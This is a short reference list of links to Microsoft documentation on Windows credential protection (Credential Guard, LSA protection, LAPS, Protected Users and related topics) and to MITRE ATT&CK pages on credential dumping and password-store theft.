- [Credential Manager API](https://learn.microsoft.com/en-us/windows/win32/api/wincred/) - Win32 Credential API
- [Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) - Protected Users
- [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/) - Credential Guard documentation
- [LSA Protection (PPL)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) - PPL for LSASS
- [LAPS Overview](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview) - Local Administrator Password Solution
- [Cached Credentials](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)) - Cached Domain Credentials
- [ASR Rules Reference](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference) - Attack Surface Reduction rules
- [MITRE T1003: OS Credential Dumping](https://attack.mitre.org/techniques/T1003/) - T1003 and sub-techniques
- [MITRE T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/) - T1555
